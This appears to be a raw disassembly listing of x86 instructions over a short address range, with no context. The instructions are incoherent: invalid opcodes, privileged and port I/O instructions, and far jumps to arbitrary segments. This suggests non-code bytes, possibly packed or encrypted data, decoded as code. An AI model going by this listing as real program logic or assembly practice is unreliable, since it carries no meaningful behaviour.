  41f634:	mov    edi,DWORD PTR [esi+0x21]
  41f637:	pop    edx
  41f638:	dec    edi
  41f63a:	sub    ecx,ebx
  41f63c:	les    ecx,FWORD PTR [eax+0x78479f75]
  41f642:	call   0x98b3:0xfa59da9d
  41f649:	lock sbb al,0xd7
  41f64c:	push   ebp
  41f64d:	ds imul eax,ebx,0xa7a51d25
  41f654:	fisttp QWORD PTR [ecx-0x1d]
  41f657:	shl    DWORD PTR [ebp+0x2f],0xf8
  41f65b:	mov    ebp,0x8781cad2
  41f660:	or     al,0xe7
  41f662:	jns    0x41f679
  41f664:	(bad)  
  41f665:	pusha  
  41f666:	std    
  41f667:	pop    ss
  41f668:	test   eax,0xa3c77558
  41f66d:	xor    ch,BYTE PTR [edi+0x684e9109]
  41f673:	je     0x41f6e0
  41f675:	cli    
  41f676:	cdq    
  41f677:	push   ecx
  41f678:	mov    dl,0x31
  41f67a:	fistp  WORD PTR [ebp+0xb3c10ca]
  41f680:	outs   dx,BYTE PTR ds:[esi]
  41f681:	xchg   BYTE PTR [ebp+eax*4+0x16025d47],ah
  41f688:	jne    0x41f62f
  41f68a:	mov    fs,WORD PTR [esi+0x6606f05b]
  41f690:	test   al,0x42
  41f692:	scas   eax,DWORD PTR es:[edi]
  41f693:	sub    eax,edx
  41f695:	imul   esp,DWORD PTR [edx-0x8],0xffffff80
  41f699:	neg    BYTE PTR [edx-0x32ab4d4]
  41f69f:	(bad)  
  41f6a0:	adc    BYTE PTR [esi+0x36],dh
  41f6a3:	in     al,dx
  41f6a4:	sub    ah,BYTE PTR [ecx]
  41f6a6:	inc    ebx
  41f6a7:	ror    DWORD PTR [ecx],0xe4
  41f6aa:	neg    DWORD PTR [esi]
  41f6ac:	sbb    cl,BYTE PTR [ecx+edi*8+0xe]
  41f6b0:	je     0x41f701
  41f6b2:	dec    esi
  41f6b3:	iret   
  41f6b4:	mov    BYTE PTR [ebx-0x69c34d5a],ch
  41f6ba:	cld    
  41f6bb:	lea    eax,[esi+edi*1]
  41f6be:	outs   dx,BYTE PTR ds:[esi]
  41f6bf:	or     esp,edx
  41f6c1:	push   esp
  41f6c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c3:	call   0xed9bbee4
  41f6c8:	enter  0xe343,0x7e
  41f6cc:	push   ecx
  41f6cd:	mov    eax,0x8058a437
  41f6d2:	jns    0x41f683
  41f6d4:	je     0x41f712
  41f6d6:	(bad)  
  41f6d7:	(bad)  
  41f6d8:	ins    BYTE PTR es:[edi],dx
  41f6d9:	xor    BYTE PTR [edx-0x13c062bd],0x56
  41f6e0:	add    al,0xcc
  41f6e2:	push   ebp
  41f6e3:	mov    ebp,0x9f32836c
  41f6e8:	nop
  41f6e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ea:	loopne 0x41f698
  41f6ec:	fcomp  st(1)
  41f6ee:	push   ss
  41f6ef:	mov    dh,0x8b
  41f6f1:	mov    ch,0xd4
  41f6f3:	pop    edx
  41f6f4:	cmp    al,BYTE PTR [ebx+0x13]
  41f6f7:	add    al,0xd8
  41f6f9:	repnz adc esi,esp
  41f6fc:	inc    eax
  41f6fd:	pop    ss
  41f6fe:	retf   0x2f4f
  41f701:	ror    DWORD PTR [ebp-0x72213eff],0xff
  41f708:	cli    
  41f709:	xor    DWORD PTR [eax-0x68a694bc],eax
  41f70f:	xchg   ecx,eax
  41f710:	cwde   
  41f711:	mov    ah,0x8f
  41f713:	je     0x41f6b3
  41f715:	push   ecx
  41f716:	mov    ebx,0x8f4e89c2
  41f71b:	neg    DWORD PTR [ebp-0x3f]
  41f71e:	mov    eax,0xca954902
  41f723:	imul   ecx,DWORD PTR [eax+0x285bde86],0x58fd1496
  41f72d:	data16 hlt 
  41f72f:	xchg   ecx,eax
  41f730:	jp     0x41f780
  41f732:	jno    0x41f740
  41f734:	leave  
  41f735:	popf   
  41f736:	arpl   WORD PTR [eax],dx
  41f738:	sub    DWORD PTR [esi],edx
  41f73a:	mov    bh,0x9f
  41f73c:	dec    eax
  41f73d:	xor    al,0xd4
  41f73f:	pop    ebp
  41f740:	das    
  41f741:	test   BYTE PTR [esi-0x2e],cl
  41f744:	in     al,0x61
  41f746:	mov    ch,0x1b
  41f748:	mov    al,0x87
  41f74a:	mov    eax,ds:0xbcf82bc1
  41f74f:	dec    edi
  41f750:	cmp    al,0xb9
  41f752:	sub    BYTE PTR [edx+0x35],ch
  41f755:	cs inc ebx
  41f757:	and    eax,0x77752522
  41f75c:	push   eax
  41f75d:	inc    ebx
  41f75e:	xchg   esi,eax
  41f75f:	shl    DWORD PTR [edi+ecx*1-0x1e],1
  41f763:	ins    BYTE PTR es:[edi],dx
  41f764:	push   ds
  41f765:	add    BYTE PTR [ebx+0xac82104],dh
  41f76b:	gs imul esi,ecx,0x4a
  41f76f:	push   ds
  41f770:	push   0x4e
  41f772:	mov    dl,0xec
  41f774:	sar    BYTE PTR [ebp-0x520ac891],1
  41f77a:	(bad)  
  41f77b:	sbb    BYTE PTR [edx],cl
  41f77d:	sbb    BYTE PTR [edx+0x33],cl
  41f780:	idiv   edi
  41f782:	lds    ebp,FWORD PTR [ecx]
  41f784:	loope  0x41f7c4
  41f786:	out    0xc9,eax
  41f788:	or     DWORD PTR [ebp+0x1dfdcb63],esp
  41f78e:	in     eax,0xa3
  41f790:	xchg   ebx,eax
  41f791:	mov    ebp,DWORD PTR [esi+0x40]
  41f794:	std    
  41f795:	jmp    0x41f7c4
  41f797:	pop    ebx
  41f798:	or     ah,BYTE PTR [edx+eiz*4-0x4edc9a4e]
  41f79f:	sub    cl,BYTE PTR [edi+esi*2-0x391879ea]
  41f7a6:	jae    0x41f7d7
  41f7a8:	mov    ch,0xa1
  41f7aa:	adc    eax,0x3bf06a1
  41f7af:	mov    edi,ds
  41f7b1:	add    eax,DWORD PTR [edi+0x27fa63a0]
  41f7b7:	cs inc edx
  41f7b9:	or     edx,DWORD PTR [edx+0x13e4d88e]
  41f7bf:	dec    eax
  41f7c0:	(bad)  
  41f7c1:	mov    edx,0x4b7e18ee
  41f7c6:	xchg   esp,eax
  41f7c7:	sub    eax,0x35535656
  41f7cc:	mov    cl,0x93
  41f7ce:	sbb    eax,0x928a77e5
  41f7d3:	dec    ebp
  41f7d4:	(bad)  
  41f7d5:	xor    al,0x5
  41f7d7:	rol    edi,1
  41f7d9:	jno    0x41f80c
  41f7db:	movhps xmm5,QWORD PTR [esi+0x5b]
  41f7df:	scas   eax,DWORD PTR es:[edi]
  41f7e0:	inc    ebp
  41f7e1:	int    0x3c
  41f7e3:	jmp    DWORD PTR [esi+eax*8]
  41f7e6:	xor    BYTE PTR [eax+0x5307d95f],bh
  41f7ec:	and    eax,DWORD PTR [esi]
  41f7ee:	bound  edx,QWORD PTR ds:0xaa844e0b
  41f7f4:	stc    
  41f7f5:	pop    ebp
  41f7f6:	mov    bl,0x5b
  41f7f8:	in     eax,0x7c
  41f7fa:	jnp    0x41f841
  41f7fc:	xor    edi,DWORD PTR [edx+0x3417c489]
  41f802:	das    
  41f803:	rcr    BYTE PTR [esi+0x73],0x7
  41f807:	iret   
  41f808:	cmp    ah,BYTE PTR [edx-0x58]
  41f80b:	mov    al,ds:0xaca3c0d7
  41f810:	adc    eax,0x22fec92e
  41f815:	mov    eax,ds:0x61ca9a5d
  41f81a:	push   es
  41f81b:	jmp    FWORD PTR [eax+0x34]
  41f81e:	js     0x41f7ba
  41f820:	lock fbstp TBYTE PTR [ebp+0x5]
  41f824:	loope  0x41f7f2
  41f826:	out    dx,al
  41f827:	jns    0x41f7ee
  41f829:	jmp    0x8cd8:0xbad733f6
  41f830:	or     bl,al
  41f832:	pop    eax
  41f833:	ins    BYTE PTR es:[edi],dx
  41f834:	adc    eax,0xf127d867
  41f839:	add    DWORD PTR [eax*2+0x31cc8f88],ebp
  41f840:	iret   
  41f841:	out    dx,eax
  41f842:	mov    esp,DWORD PTR [ebp+ecx*1+0x35]
  41f846:	cld    
  41f847:	sbb    BYTE PTR [ebp-0x31],bh
  41f84a:	rcr    edi,0x82
  41f84d:	fldenv [ecx]
  41f84f:	mov    ebp,0xaa1de6b2
  41f854:	and    bl,dh
  41f856:	dec    eax
  41f857:	(bad)  
  41f858:	xor    bh,BYTE PTR [edx]
  41f85a:	push   ebp
  41f85b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f85c:	in     eax,0x33
  41f85e:	lods   eax,DWORD PTR ds:[esi]
  41f85f:	add    dh,BYTE PTR [ecx-0x7fc70892]
  41f865:	push   cs
  41f866:	inc    esi
  41f867:	mov    ecx,0xfd8ffb43
  41f86c:	pop    ecx
  41f86d:	inc    esi
  41f86e:	push   ecx
  41f86f:	push   ecx
  41f870:	ds clc 
  41f872:	xor    bh,BYTE PTR [edx]
  41f874:	ret    
  41f875:	push   ecx
  41f876:	sub    DWORD PTR [edi],eax
  41f878:	lea    eax,[eax+0xa]
  41f87b:	fst    st(5)
  41f87d:	cmp    edx,ecx
  41f87f:	pusha  
  41f880:	xor    DWORD PTR [ecx+0x44],ebx
  41f883:	pop    esi
  41f884:	cmc    
  41f885:	dec    esi
  41f886:	cmp    al,0xfd
  41f888:	les    ebx,FWORD PTR [edx+0x2a0ba887]
  41f88e:	pop    ss
  41f88f:	retf   
  41f890:	ja     0x41f885
  41f892:	xchg   esi,eax
  41f893:	ss mov dh,0x74
  41f896:	int    0xc8
  41f898:	(bad)  
  41f899:	in     al,0xbb
  41f89b:	inc    DWORD PTR [ebp+0x46]
  41f89e:	shr    DWORD PTR [esi-0x2e489c1c],0xe7
  41f8a5:	jecxz  0x41f882
  41f8a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8a8:	mov    DWORD PTR [edx],esi
  41f8aa:	cmp    edx,edx
  41f8ac:	and    cl,BYTE PTR [ecx+0x4575e641]
  41f8b2:	int    0x5b
  41f8b4:	mov    edi,0x6dd9632a
  41f8b9:	sub    ch,cl
  41f8bb:	sbb    al,0x9e
  41f8bd:	shr    DWORD PTR [edi],1
  41f8bf:	pop    ss
  41f8c0:	sar    BYTE PTR [eax+ecx*8],0x42
  41f8c4:	loope  0x41f8a3
  41f8c6:	int    0xb9
  41f8c8:	pop    ss
  41f8c9:	pop    es
  41f8ca:	sti    
  41f8cb:	xchg   esp,ecx
  41f8cd:	iret   
  41f8ce:	(bad)  
  41f8cf:	cmc    
  41f8d0:	jecxz  0x41f916
  41f8d2:	add    ah,BYTE PTR [eax]
  41f8d4:	rcl    ch,1
  41f8d6:	dec    edi
  41f8d7:	mov    edi,0x209983cf
  41f8dc:	jg     0x41f8f6
  41f8de:	jge    0x41f87c
  41f8e0:	xor    DWORD PTR [ebp+0x44ecc7e8],0xffffffff
  41f8e7:	sti    
  41f8e8:	(bad)  
  41f8e9:	mov    edi,0xfcaa7ef0
  41f8ee:	cdq    
  41f8ef:	dec    eax
  41f8f0:	and    BYTE PTR [edi+0x2f54e82d],bl
  41f8f6:	fsubr  st(2),st
  41f8f8:	inc    edi
  41f8f9:	pop    ebx
  41f8fa:	pop    ebp
  41f8fb:	or     eax,0xa5a4bd79
  41f900:	in     eax,0x71
  41f902:	push   0x91f8a9de
  41f907:	jns    0x41f8d2
  41f909:	jmp    0x4a748b79
  41f90e:	lock imul ebx,ebp,0x786791c6
  41f915:	mov    edx,0xf83577d3
  41f91a:	jge    0x41f8f7
  41f91c:	inc    ebx
  41f91d:	push   edx
  41f91e:	retf   0xe561
  41f921:	mov    eax,0xdcde4aa2
  41f926:	cmp    edi,esi
  41f928:	sbb    BYTE PTR [edx+0xe27fd35],0x1b
  41f92f:	rcr    BYTE PTR [edx+0x16c3bf76],0x46
  41f936:	mov    ds:0x41f06c1d,eax
  41f93b:	bswap  edx
  41f93d:	fwait
  41f93e:	push   bp
  41f940:	(bad)  
  41f941:	pushf  
  41f942:	add    al,0x2f
  41f944:	jle    0x41f8e2
  41f946:	xchg   dh,cl
  41f948:	dec    esp
  41f949:	shr    BYTE PTR [eax-0x62],1
  41f94c:	mov    ch,0x21
  41f94e:	xor    ah,BYTE PTR [eax]
  41f950:	iret   
  41f951:	dec    esp
  41f952:	pop    ss
  41f953:	fimul  DWORD PTR [ebp-0x21cdf06d]
  41f959:	mov    eax,ds
  41f95b:	jl     0x41f9b3
  41f95d:	push   ecx
  41f95e:	cmp    DWORD PTR [edx],esp
  41f960:	in     al,0x9e
  41f962:	sub    ch,BYTE PTR [ecx+0x62]
  41f965:	jmp    0xbf88:0x5b32393e
  41f96c:	push   0x17
  41f96e:	mov    esp,0x47456acc
  41f973:	sub    esi,DWORD PTR [esi+edi*1-0x4b9ed30c]
  41f97a:	sub    DWORD PTR [eax+eax*1-0x39d369],ebx
  41f981:	and    al,0x92
  41f983:	push   eax
  41f984:	xchg   DWORD PTR [ecx-0xc],edi
  41f987:	jle    0x41f9d3
  41f989:	and    BYTE PTR [edi+ebp*1-0x55],dh
  41f98d:	arpl   WORD PTR [ebp+0x2f5857c8],ax
  41f993:	imul   edi,DWORD PTR [edi+0x6745eea6],0xffffffc2
  41f99a:	nop
  41f99b:	or     eax,0x210388e8
  41f9a0:	mov    al,0x1e
  41f9a2:	mov    WORD PTR [ebx+0x54b3ae5f],?
  41f9a8:	popa   
  41f9a9:	jecxz  0x41f97e
  41f9ab:	push   ecx
  41f9ac:	push   ecx
  41f9ad:	jmp    0x3d0fc9ea
  41f9b2:	mov    esp,0xb02b4428
  41f9b7:	inc    edi
  41f9b8:	or     BYTE PTR [ecx-0x30],al
  41f9bb:	inc    esi
  41f9bc:	in     al,0xa9
  41f9be:	in     al,dx
  41f9bf:	xor    al,dh
  41f9c1:	inc    esp
  41f9c2:	sub    al,BYTE PTR cs:[ebp+0x4c7f9d53]
  41f9c9:	pop    esi
  41f9ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9cb:	jnp    0x41f99e
  41f9cd:	add    DWORD PTR [edx],edx
  41f9cf:	cmp    ch,BYTE PTR [edx+0x17]
  41f9d2:	mov    eax,0x48292b03
  41f9d7:	mov    ebx,0xc8c6e4c3
  41f9dc:	push   0x17
  41f9de:	inc    edi
  41f9df:	(bad)  
  41f9e0:	xor    DWORD PTR [eax],ebx
  41f9e2:	jge    0x41f9a9
  41f9e4:	call   0x5677:0x7e43ab05
  41f9eb:	es cdq 
  41f9ed:	ins    BYTE PTR es:[edi],dx
  41f9ee:	ins    BYTE PTR es:[edi],dx
  41f9ef:	imul   eax,DWORD PTR [eax+0x5c745d0],0x54
  41f9f6:	mov    al,0x67
  41f9f8:	not    DWORD PTR [ecx+0x4402a6ac]
  41f9fe:	adc    esp,DWORD PTR [ecx-0x47b6e581]
  41fa04:	jb     0x41fa73
  41fa06:	sbb    DWORD PTR [ebp-0x11],edx
  41fa09:	cmp    dl,BYTE PTR [esi]
  41fa0b:	pop    es
  41fa0c:	mov    edx,0x11ac334c
  41fa11:	test   dh,al
  41fa13:	dec    esi
  41fa14:	sbb    ebp,DWORD PTR [ecx]
  41fa16:	sbb    BYTE PTR [edi+0x3e1a8c67],bh
  41fa1c:	mov    bl,0x74
  41fa1e:	retf   
  41fa1f:	and    ch,0x46
  41fa22:	ror    BYTE PTR [edx+0x72],1
  41fa25:	sub    al,0xf0
  41fa27:	dec    ebx
  41fa28:	(bad)  
  41fa29:	cli    
  41fa2a:	mov    BYTE PTR [esi+eiz*1],ch
  41fa2d:	push   ebp
  41fa2e:	out    dx,eax
  41fa2f:	repz jmp 0x5f4:0xe413e31e
  41fa37:	lods   al,BYTE PTR gs:[esi]
  41fa39:	test   al,0xd
  41fa3b:	inc    eax
  41fa3c:	dec    eax
  41fa3d:	pusha  
  41fa3e:	icebp  
  41fa3f:	test   esp,0x9a4f4aae
  41fa45:	sub    edx,eax
  41fa47:	and    BYTE PTR [ebp+ebp*4+0x43531182],ah
  41fa4e:	jne    0x41fa2c
  41fa50:	mov    dh,0x36
  41fa52:	pop    esp
  41fa53:	mov    ebx,0x83fda588
  41fa58:	mov    eax,0x52e4c77c
  41fa5d:	ret    
  41fa5e:	fcom   QWORD PTR es:[ebx]
  41fa61:	cmp    ecx,edi
  41fa63:	push   es
  41fa64:	hlt    
  41fa65:	inc    edx
  41fa66:	jecxz  0x41fa85
  41fa68:	xor    ebx,DWORD PTR [ebp+edx*2+0x4381f955]
  41fa6f:	aas    
  41fa70:	aas    
  41fa71:	sbb    BYTE PTR [edi-0x25c490aa],bl
  41fa77:	test   al,ch
  41fa79:	or     eax,0x843907e3
  41fa7e:	(bad)  
  41fa7f:	fsubr  st,st(0)
  41fa81:	jae    0x41fa20
  41fa83:	lods   al,BYTE PTR ds:[esi]
  41fa84:	ret    0x3879
  41fa87:	ds pop ebp
  41fa89:	mov    dh,0xa5
  41fa8b:	inc    ebx
  41fa8c:	jl     0x41faf8
  41fa8e:	dec    eax
  41fa8f:	cs shl ch,0x23
  41fa93:	cmc    
  41fa94:	sub    edi,DWORD PTR [eax]
  41fa96:	adc    ecx,DWORD PTR [edi-0x5423346e]
  41fa9c:	outs   dx,DWORD PTR ds:[esi]
  41fa9d:	dec    ecx
  41fa9e:	mov    dh,0x7a
  41faa0:	fsub   QWORD PTR [ebp-0x5dc2b229]
  41faa6:	push   cs
  41faa7:	imul   ebx,ebp,0xc22493bc
  41faad:	inc    ecx
  41faae:	dec    ecx
  41faaf:	sub    esp,DWORD PTR [edx+0x586ade44]
  41fab5:	(bad)  
  41fab6:	enter  0x7c41,0x92
  41faba:	js     0x41fb29
  41fabc:	daa    
  41fabd:	push   esp
  41fabe:	aam    0xbc
  41fac0:	pop    es
  41fac1:	push   edx
  41fac2:	sbb    BYTE PTR [esi],dh
  41fac4:	and    esp,edi
  41fac6:	push   eax
  41fac7:	std    
  41fac8:	scas   al,BYTE PTR es:[edi]
  41fac9:	mov    al,0xce
  41facb:	jae    0x41fa72
  41facd:	fwait
  41face:	xor    dl,0xcb
  41fad1:	jl     0x41fa92
  41fad3:	fisub  WORD PTR [esi]
  41fad5:	fwait
  41fad6:	ret    
  41fad7:	xchg   ebp,eax
  41fad8:	into   
  41fad9:	popf   
  41fada:	mov    eax,0xac4cc4e5
  41fadf:	sti    
  41fae0:	sbb    BYTE PTR [ebp-0x6b],bh
  41fae3:	sbb    ebx,DWORD PTR [edi]
  41fae5:	test   al,0x8f
  41fae7:	ss pop eax
  41fae9:	aad    0xd4
  41faeb:	lea    ebx,[eax+0x25]
  41faee:	sbb    ah,bh
  41faf0:	inc    ecx
  41faf1:	jmp    0xacc1:0xe12476d2
  41faf8:	or     eax,0x51
  41fafb:	retf   0x1721
  41fafe:	adc    al,0xf3
  41fb00:	outs   dx,DWORD PTR ds:[esi]
  41fb01:	outs   dx,BYTE PTR ds:[esi]
  41fb02:	inc    ecx
  41fb03:	sbb    esp,DWORD PTR [ebp+0x47053b46]
  41fb09:	ficom  WORD PTR [esi+eax*4-0x9dd3aa6]
  41fb10:	push   ds
  41fb11:	retf   0xae7
  41fb14:	jbe    0x41faf7
  41fb16:	scas   al,BYTE PTR es:[edi]
  41fb17:	mov    ds:0xaa0c4555,al
  41fb1c:	jbe    0x41facb
  41fb1e:	arpl   WORD PTR [esi-0x2c],ax
  41fb21:	(bad)  
  41fb22:	stc    
  41fb23:	mov    dh,0xe8
  41fb25:	add    DWORD PTR [ecx],eax
  41fb27:	cmp    esp,DWORD PTR [edx+esi*1-0x27]
  41fb2b:	sbb    eax,0xd515ee60
  41fb30:	xchg   esi,eax
  41fb31:	aaa    
  41fb32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb33:	pushf  
  41fb34:	mov    bl,0x92
  41fb36:	push   cs
  41fb37:	popa   
  41fb38:	sub    al,0x9f
  41fb3a:	sub    al,0x66
  41fb3c:	xchg   ah,bh
  41fb3e:	daa    
  41fb3f:	push   esp
  41fb40:	js     0x3d8f1b33
  41fb46:	push   cs
  41fb47:	xchg   ebx,eax
  41fb48:	outs   dx,DWORD PTR ds:[esi]
  41fb49:	or     BYTE PTR [ebx+edx*1+0x4886c778],al
  41fb50:	cdq    
  41fb51:	pusha  
  41fb52:	jns    0x41fb9a
  41fb54:	fiadd  DWORD PTR [ebp+0x6f]
  41fb57:	and    eax,0x4cf544b1
  41fb5c:	adc    ah,cl
  41fb5e:	jne    0x41fb05
  41fb60:	popf   
  41fb61:	fist   DWORD PTR ds:0x2028c90b
  41fb67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb68:	(bad)  [eax+0x49]
  41fb6b:	push   edi
  41fb6c:	shr    DWORD PTR [ebx+edi*4+0x21fd7c5d],1
  41fb73:	xchg   esp,eax
  41fb74:	ins    BYTE PTR es:[edi],dx
  41fb75:	sbb    eax,0x91c03f47
  41fb7a:	into   
  41fb7b:	sub    eax,0x1a66dedd
  41fb80:	mov    ds:0x39aa8611,al
  41fb85:	icebp  
  41fb86:	mov    bh,0x82
  41fb88:	mov    ds:0x3d5d353e,al
  41fb8e:	mov    edx,0x365e7f4f
  41fb93:	dec    esi
  41fb94:	imul   esp,DWORD PTR [ebp+0x2f2b4ac],0x1
  41fb9b:	lods   al,BYTE PTR ds:[esi]
  41fb9c:	in     eax,dx
  41fb9d:	ret    0xc0cf
  41fba0:	add    al,0x91
  41fba2:	fsubr  DWORD PTR [esi+esi*4-0x68]
  41fba6:	mov    eax,es
  41fba8:	outs   dx,BYTE PTR ds:[esi]
  41fba9:	push   ebp
  41fbaa:	mov    esp,0x7e5a5d26
  41fbaf:	fcomp  QWORD PTR [edi]
  41fbb1:	xchg   edx,eax
  41fbb2:	in     al,dx
  41fbb3:	sbb    esi,ecx
  41fbb5:	pop    DWORD PTR [edi]
  41fbb7:	lods   al,BYTE PTR ds:[esi]
  41fbb8:	adc    BYTE PTR ds:0x7f398b90,cl
  41fbbe:	jecxz  0x41fb7d
  41fbc0:	sbb    eax,0xc936084c
  41fbc5:	adc    edi,DWORD PTR [ebp-0x12bf9ec5]
  41fbcb:	mov    dh,0xd9
  41fbcd:	mov    WORD PTR [ecx],cs
  41fbcf:	inc    ecx
  41fbd0:	jge    0x41fb75
  41fbd2:	lods   eax,DWORD PTR ds:[esi]
  41fbd3:	scas   al,BYTE PTR es:[edi]
  41fbd4:	mov    dh,0xbf
  41fbd6:	inc    esi
  41fbd7:	jg     0x41fba7
  41fbd9:	mov    cl,dl
  41fbdb:	xchg   edx,eax
  41fbdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbdd:	sbb    al,0x59
  41fbdf:	mov    ecx,DWORD PTR [eax+eax*2+0x3ea810a9]
  41fbe6:	mov    cl,0x4c
  41fbe8:	neg    dh
  41fbea:	pop    edx
  41fbeb:	jl     0x41fb7e
  41fbed:	out    dx,eax
  41fbee:	outs   dx,BYTE PTR ds:[esi]
  41fbef:	push   edi
  41fbf0:	mov    al,ds:0xad6f9ea7
  41fbf5:	ins    DWORD PTR es:[edi],dx
  41fbf6:	(bad)  
  41fbf7:	fcmovne st,st(3)
  41fbf9:	ficomp DWORD PTR [eax-0x24]
  41fbfc:	stc    
  41fbfd:	add    ebx,DWORD PTR [esi+0x9]
  41fc00:	add    BYTE PTR [ebp-0x1dbdc23d],cl
  41fc06:	xchg   edx,eax
  41fc07:	mov    dh,BYTE PTR [edx+0x30]
  41fc0a:	mov    bl,0x2c
  41fc0c:	push   eax
  41fc0d:	lahf   
  41fc0e:	push   esp
  41fc0f:	in     eax,dx
  41fc10:	push   edx
  41fc11:	ret    
  41fc12:	inc    esp
  41fc13:	xchg   esp,eax
  41fc14:	cmp    al,0x31
  41fc16:	dec    ebx
  41fc17:	(bad)  
  41fc18:	test   al,0xcb
  41fc1a:	mov    al,0x85
  41fc1c:	mov    bh,0xe6
  41fc1e:	jbe    0x41fc86
  41fc20:	test   dl,bl
  41fc22:	imul   edi,DWORD PTR [edx+0x1c],0xbc84e60b
  41fc29:	mul    BYTE PTR [ebx-0x37]
  41fc2c:	adc    al,0xdc
  41fc2e:	cmc    
  41fc2f:	rcr    BYTE PTR [ebx],0xd1
  41fc32:	sar    ebp,0x49
  41fc35:	and    eax,0x15372392
  41fc3a:	mov    dh,0xf
  41fc3c:	mov    ebx,0xb7ebce1
  41fc41:	xchg   DWORD PTR [esi],eax
  41fc43:	add    eax,0x641d5112
  41fc48:	pop    ebp
  41fc49:	call   0x9e59:0xeaccf5f1
  41fc50:	out    dx,eax
  41fc51:	push   ebx
  41fc52:	and    esi,edi
  41fc54:	loop   0x41fbeb
  41fc56:	sub    al,0x83
  41fc58:	mov    dh,0x4c
  41fc5a:	(bad)  
  41fc5b:	(bad)  
  41fc5c:	adc    eax,0x22739d67
  41fc61:	out    0xf6,al
  41fc63:	ds inc ecx
  41fc65:	xor    eax,0x6eab0116
  41fc6a:	fmul   DWORD PTR [esi+edi*1+0x112ce19f]
  41fc71:	cmp    ebp,DWORD PTR [edx+0x11]
  41fc74:	lea    esp,[ebx-0x4b]
  41fc77:	inc    esp
  41fc78:	fsubp  st(1),st
  41fc7a:	sar    BYTE PTR [edx-0x45],cl
  41fc7d:	adc    esp,DWORD PTR [edi-0xa]
  41fc80:	addr16 leave 
  41fc82:	sub    BYTE PTR [eax+0x10cae6a2],ch
  41fc88:	test   al,0xae
  41fc8a:	xchg   ebp,eax
  41fc8b:	retf   
  41fc8c:	dec    edx
  41fc8d:	dec    ebx
  41fc8e:	icebp  
  41fc8f:	mov    eax,0x2ab2ddf4
  41fc94:	std    
  41fc95:	int3   
  41fc96:	arpl   WORD PTR [ebx+0x41],bx
  41fc99:	cs je  0x41fc2f
  41fc9c:	retf   
  41fc9d:	inc    ebx
  41fc9e:	or     BYTE PTR [ebp+0x28900d26],cl
  41fca4:	std    
  41fca5:	jl     0x41fc38
  41fca7:	shl    BYTE PTR [esi+0x2e],1
  41fcaa:	jmp    0x13cf:0x51b5abeb
  41fcb1:	aam    0xd6
  41fcb3:	in     al,0x61
  41fcb5:	ins    BYTE PTR es:[edi],dx
  41fcb6:	lods   eax,DWORD PTR ds:[esi]
  41fcb7:	add    DWORD PTR [ecx-0x79],ebp
  41fcba:	fcomp  QWORD PTR [esi+ebp*2+0x2b]
  41fcbe:	out    dx,eax
  41fcbf:	clc    
  41fcc0:	add    dl,ch
  41fcc2:	cmp    eax,0xc268279d
  41fcc7:	fld    DWORD PTR [ecx-0xe]
  41fcca:	sub    DWORD PTR [esp+edx*1-0x1c],0x27
  41fccf:	and    BYTE PTR [eax+0x65431506],dl
  41fcd5:	mov    ds:0x389ac943,al
  41fcda:	popa   
  41fcdb:	mov    ebp,0x1a5edc96
  41fce0:	std    
  41fce1:	(bad)  
  41fce2:	test   DWORD PTR [ebx-0x1e],0xda49c87b
  41fce9:	or     BYTE PTR [edx-0xf9fceb1],al
  41fcef:	ss ret 0x6caf
  41fcf3:	mov    dl,0x2f
  41fcf5:	mov    al,ds:0xa6b9d809
  41fcfa:	aam    0x9c
  41fcfc:	(bad)  
  41fcfe:	or     BYTE PTR [edi],ch
  41fd00:	push   ds
  41fd01:	pinsrw mm6,WORD PTR [eax],0x1a
  41fd05:	adc    eax,eax
  41fd07:	xor    BYTE PTR [ecx],0x6
  41fd0a:	icebp  
  41fd0b:	adc    BYTE PTR [ebp+0x20],ah
  41fd0e:	aaa    
  41fd0f:	push   cs
  41fd10:	imul   esi,DWORD PTR [ecx+eiz*4],0xffffffdf
  41fd14:	cli    
  41fd15:	jb     0x41fd79
  41fd17:	stc    
  41fd18:	pop    es
  41fd19:	outs   dx,DWORD PTR ds:[esi]
  41fd1a:	ja     0x41fcd8
  41fd1c:	adc    edx,DWORD PTR [ebx]
  41fd1e:	push   eax
  41fd1f:	xor    bl,BYTE PTR [ecx]
  41fd21:	xor    al,0x9a
  41fd23:	xor    eax,0x9fabe56
  41fd28:	(bad)  
  41fd29:	call   0x4c07:0xa8a7355d
  41fd30:	fmul   DWORD PTR [ebx+0x7f]
  41fd33:	call   0x6e11:0x25dd594
  41fd3a:	dec    ebp
  41fd3b:	(bad)  
  41fd3d:	js     0x41fd97
  41fd3f:	push   eax
  41fd40:	add    edx,edx
  41fd42:	not    BYTE PTR [edi+ebx*8]
  41fd45:	fcom   QWORD PTR [ecx-0x229878bb]
  41fd4b:	adc    BYTE PTR [ebx-0x70071267],cl
  41fd51:	mov    eax,DWORD PTR [edx-0x5e]
  41fd54:	inc    ecx
  41fd55:	add    eax,0x1c378499
  41fd5a:	ret    
  41fd5b:	in     eax,0x7
  41fd5d:	int    0xca
  41fd5f:	arpl   bx,si
  41fd61:	push   ds
  41fd62:	arpl   WORD PTR [edx-0x60],bx
  41fd65:	out    0xc0,al
  41fd67:	or     eax,0xf5ed3653
  41fd6c:	or     edi,ecx
  41fd6e:	sbb    BYTE PTR [edi-0x612e045a],ch
  41fd74:	test   DWORD PTR [ebx-0x69],ebx
  41fd77:	mov    eax,ds:0xba5d8c1
  41fd7c:	sbb    eax,DWORD PTR [ecx]
  41fd7e:	push   ds
  41fd7f:	pop    ds
  41fd80:	out    dx,eax
  41fd81:	ficomp WORD PTR [ebx+0x6f]
  41fd85:	sahf   
  41fd86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd87:	cmp    cl,BYTE PTR [edx+0x5a]
  41fd8a:	in     eax,0x3b
  41fd8c:	cld    
  41fd8d:	cld    
  41fd8e:	es adc eax,0x616819f9
  41fd94:	push   ebx
  41fd95:	stos   BYTE PTR es:[edi],al
  41fd96:	shr    BYTE PTR [ecx+0x1df0396f],1
  41fd9c:	inc    esi
  41fd9d:	push   esi
  41fd9e:	das    
  41fd9f:	mov    bh,0x42
  41fda1:	cmp    bh,BYTE PTR [ebx-0x20]
  41fda4:	ss inc eax
